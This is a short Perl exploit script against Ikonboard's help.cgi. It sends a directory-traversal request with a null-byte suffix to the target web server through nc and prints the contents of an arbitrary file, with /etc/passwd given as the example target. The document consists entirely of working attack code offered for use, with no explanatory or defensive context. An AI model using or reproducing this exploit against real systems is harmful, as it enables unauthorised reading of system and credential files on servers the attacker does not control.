#!/usr/bin/perl

$usage="$0 [ikonboard.host.com] [/path/to/help.cgi] [/etc/passwd]\n";
$HOST=shift || die $usage;
$WHERE=shift || die $usage;
$WHAT=shift || die $usage;

@OUT=`echo -en "GET http://$HOST/$WHERE?helpon=../../../../..$WHAT%00 HTTP/1.0\
n\n" | nc $HOST 80`;

foreach(@OUT){
        if (/\.\.\/\.\.\/\.\.\/\.\.\/\.\./) {
                $found=1;
                next;
        }
        $found = 0 if (/href="help\.cgi"/);

        next until $found;
        s/^                           \s//g;
        $o.=$_;
}

print $o;

